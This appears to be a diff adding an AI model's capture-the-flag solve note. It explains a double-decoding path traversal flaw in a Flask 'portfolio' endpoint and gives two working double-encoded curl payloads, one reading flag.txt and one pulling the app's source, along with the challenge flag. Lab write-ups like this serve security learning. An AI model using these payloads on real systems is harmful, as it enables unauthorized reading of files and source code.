@@ -1,0 +1,26 @@
+Flag: `ctfzone{lfi_t01_early1_f0r_n0w_138414892}`
+
+Bug: `/portfolio?section=...` does one sanitization pass, then calls `urllib.parse.unquote()` again before reading a file from `templates/sections/`. That makes it vulnerable to double-encoded path traversal.
+
+Working payload:
+```bash
+curl -sS 'http://labs.ctfzone.com:7727/portfolio?section=..%252f..%252f..%252f%2566%256c%2561%2567.txt'
+```
+
+Why this works:
+- `..%252f` becomes `..%2f` after Flask decoding, so the first filter does not see `../`
+- the app decodes again, turning it into `../`
+- `%2566%256c%2561%2567.txt` becomes `%66%6c%61%67.txt` first, so the first filter does not see `flag`
+- the second decode turns that into `flag.txt`
+
+I also pulled the source with:
+```bash
+curl -sS 'http://labs.ctfzone.com:7727/portfolio?section=..%252f..%252f..%252fapp%252fapp.py'
+```
+
+That confirmed the exact flaw:
+- weak blacklist in `sanitize_path()`
+- second `urllib.parse.unquote(safe_section)`
+- file read via `open(normalized_path, "r")`
+
+If you want, I can turn both solves into a short writeup in `phonebook.txt`.
